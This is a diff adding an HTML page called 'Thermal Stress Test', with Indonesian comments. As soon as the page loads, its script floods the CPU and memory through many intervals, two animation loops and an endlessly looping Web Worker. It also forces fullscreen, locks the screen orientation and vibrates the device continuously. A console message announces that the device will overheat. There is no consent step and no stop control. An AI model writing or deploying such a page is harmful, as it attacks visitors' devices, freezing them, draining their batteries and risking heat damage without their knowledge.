@@ -1,1 +1,140 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thermal Stress Test</title>
+    <style>
+        body { margin:0; background:#000; overflow:hidden; }
+        canvas { display:block; }
+    </style>
+</head>
+<body>
+    <canvas id="c"></canvas>
 
+    <script>
+        const canvas = document.getElementById('c');
+        const ctx = canvas.getContext('2d', { alpha: false });
+        
+        let w, h;
+        
+        function resize() {
+            w = canvas.width = window.innerWidth * 2;
+            h = canvas.height = window.innerHeight * 2;
+        }
+        resize();
+        window.addEventListener('resize', resize);
+
+        // WebGL fallback jika tersedia untuk beban lebih berat
+        let gl;
+        try {
+            const glCanvas = document.createElement('canvas');
+            gl = glCanvas.getContext('webgl2') || glCanvas.getContext('webgl');
+        } catch(e) {}
+
+        // Array besar untuk memakan memory dan CPU
+        let heavyData = new Array(5000000).fill(0).map(() => Math.random() * 999999999);
+
+        function burnCPU() {
+            // Loop intensif
+            for (let i = 0; i < 10000000; i++) {
+                heavyData[i % heavyData.length] = Math.sin(i) * Math.cos(i) * Math.sqrt(i) * Math.random();
+            }
+            
+            // Matrix multiplication simulasi
+            let matrixA = new Array(512).fill(0).map(() => new Array(512).fill(0).map(Math.random));
+            let matrixB = new Array(512).fill(0).map(() => new Array(512).fill(0).map(Math.random));
+            let result = new Array(512).fill(0).map(() => new Array(512).fill(0));
+            
+            for (let i = 0; i < 512; i++) {
+                for (let j = 0; j < 512; j++) {
+                    for (let k = 0; k < 512; k++) {
+                        result[i][j] += matrixA[i][k] * matrixB[k][j];
+                    }
+                }
+            }
+        }
+
+        // Canvas rendering loop super berat
+        function render() {
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, w, h);
+            
+            // Ribuan partikel + efek chaos
+            ctx.strokeStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
+            for (let i = 0; i < 5000; i++) {
+                const x = Math.random() * w;
+                const y = Math.random() * h;
+                ctx.beginPath();
+                ctx.moveTo(x, y);
+                ctx.lineTo(x + Math.random()*100 - 50, y + Math.random()*100 - 50);
+                ctx.stroke();
+            }
+            
+            // Tambahan beban rendering
+            ctx.font = 'bold 200px Arial';
+            ctx.fillStyle = `rgba(255,${Math.random()*100},0,0.8)`;
+            ctx.fillText('THERMAL', Math.random()*w/2, Math.random()*h);
+            ctx.fillText('OVERLOAD', Math.random()*w/2, Math.random()*h + 200);
+            
+            burnCPU(); // Panggil fungsi pembakar CPU
+        }
+
+        // Multiple interval untuk multi-threading simulasi
+        setInterval(render, 1);           // \~1000 FPS target
+        setInterval(burnCPU, 1);
+        setInterval(burnCPU, 5);
+        setInterval(burnCPU, 10);
+
+        // Web Worker untuk beban tambahan di background thread
+        if (window.Worker) {
+            const workerCode = `
+                self.onmessage = function() {
+                    let data = new Array(10000000);
+                    while(true) {
+                        for(let i=0; i<10000000; i++) {
+                            data[i] = Math.random() * Math.tan(i) * Math.log(i+1);
+                        }
+                        self.postMessage('burn');
+                    }
+                };
+            `;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const worker = new Worker(URL.createObjectURL(blob));
+            worker.postMessage('start');
+        }
+
+        // Fullscreen + prevent sleep
+        function forceFullscreen() {
+            if (canvas.requestFullscreen) canvas.requestFullscreen();
+            else if (canvas.webkitRequestFullscreen) canvas.webkitRequestFullscreen();
+            else if (canvas.msRequestFullscreen) canvas.msRequestFullscreen();
+        }
+        
+        // Lock orientation dan vibration (jika tersedia)
+        if (screen.orientation && screen.orientation.lock) {
+            screen.orientation.lock('portrait').catch(()=>{});
+        }
+        
+        // Vibration loop jika API tersedia
+        setInterval(() => {
+            if (navigator.vibrate) navigator.vibrate([50, 30, 50]);
+        }, 300);
+
+        // Mulai langsung
+        forceFullscreen();
+        render();
+        
+        // Tambahan beban dengan requestAnimationFrame loop ganda
+        function heavyLoop() {
+            burnCPU();
+            render();
+            requestAnimationFrame(heavyLoop);
+        }
+        heavyLoop();
+        heavyLoop(); // Double loop
+
+        console.log("%cTHERMAL STRESS INITIATED - DEVICE WILL OVERHEAT", "color:red;font-size:20px");
+    </script>
+</body>
+  </html>
